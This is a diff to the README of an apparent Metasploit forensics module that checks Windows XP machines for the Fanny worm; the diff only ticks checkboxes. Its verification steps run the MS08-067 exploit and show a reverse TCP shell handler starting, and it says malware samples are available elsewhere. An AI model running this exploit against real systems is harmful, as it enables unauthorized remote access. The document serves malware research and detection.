@@ -11,14 +11,14 @@ POC https://user-images.githubusercontent.com/68499986/102911824-e2678280-447c-1
 
 
   #### supported Environments:
-    - [ ] Windows x86
+    - [x] Windows x86
 
   ####  supported SessionTypes:
-    - [ ]  Meterpreter
-    - [ ]  Shell
+    - [x]  Meterpreter
+    - [x]  Shell
 
   #### supported OS's:
-    - [ ] Windows XP Pro (SP3)
+    - [x] Windows XP Pro (SP3)
 
 -------------------------
 
@@ -26,19 +26,19 @@ POC https://user-images.githubusercontent.com/68499986/102911824-e2678280-447c-1
 ## Verification Steps
 
 
-- [ ] First, Git clone the fanny_bmp_check.rb from https://github.com/loneicewolf/metasploit_fanny_check_module/blob/main/fanny_bmp_check.rb
+- [x] First, Git clone the fanny_bmp_check.rb from https://github.com/loneicewolf/metasploit_fanny_check_module/blob/main/fanny_bmp_check.rb
 
-- [ ] place it into your msf folder, (important, check the following step before placing it) usually located in /root/.msf4/modules/
+- [x] place it into your msf folder, (important, check the following step before placing it) usually located in /root/.msf4/modules/
 
-- [ ] * make the following folders: (under each other) /post/windows/gather/forensics/ <fanny_bmp_check.rb here>
+- [x] * make the following folders: (under each other) /post/windows/gather/forensics/ <fanny_bmp_check.rb here>
 
-- [ ] Start msfconsole
+- [x] Start msfconsole
 
-- [ ] use exploit/windows/smb/ms08_067_netapi
+- [x] use exploit/windows/smb/ms08_067_netapi
 
-- [ ] set RHOST and LHOST.
+- [x] set RHOST and LHOST.
 
-- [ ] msf6 exploit(windows/smb/ms08_067_netapi) > run
+- [x] msf6 exploit(windows/smb/ms08_067_netapi) > run
 
         [*] Started reverse TCP handler on 192.168.122.1:4444 
         [*] 192.168.122.160:445 - Automatically detecting the target...
@@ -97,14 +97,14 @@ If needed, I included malware samples on the same page.
 
 ## References
 
-- [ ] https://securelist.com/a-fanny-equation-i-am-your-father-stuxnet/68787
-- [ ] https://fmnagisa.wordpress.com/2020/08/27/revisiting-equationgroups-fanny-worm-or-dementiawheel/
-- [ ] https://edwardsnowden.com/wp-content/uploads/2017/06/FOXACID-Server-SOP-Redacted.pdf
+- [x] https://securelist.com/a-fanny-equation-i-am-your-father-stuxnet/68787
+- [x] https://fmnagisa.wordpress.com/2020/08/27/revisiting-equationgroups-fanny-worm-or-dementiawheel/
+- [x] https://edwardsnowden.com/wp-content/uploads/2017/06/FOXACID-Server-SOP-Redacted.pdf
 
 
 ### Optional reading
 
-- [ ] https://github.com/loneicewolf/fanny.bmp/blob/main/2004.06195.pdf
+- [x] https://github.com/loneicewolf/fanny.bmp/blob/main/2004.06195.pdf
 
 -------------------------
 
@@ -113,7 +113,7 @@ If needed, I included malware samples on the same page.
 
 ### Tested on
 
-  - [ ] Windows XP Pro SP3 English
+  - [x] Windows XP Pro SP3 English
 
 
 -------------------------
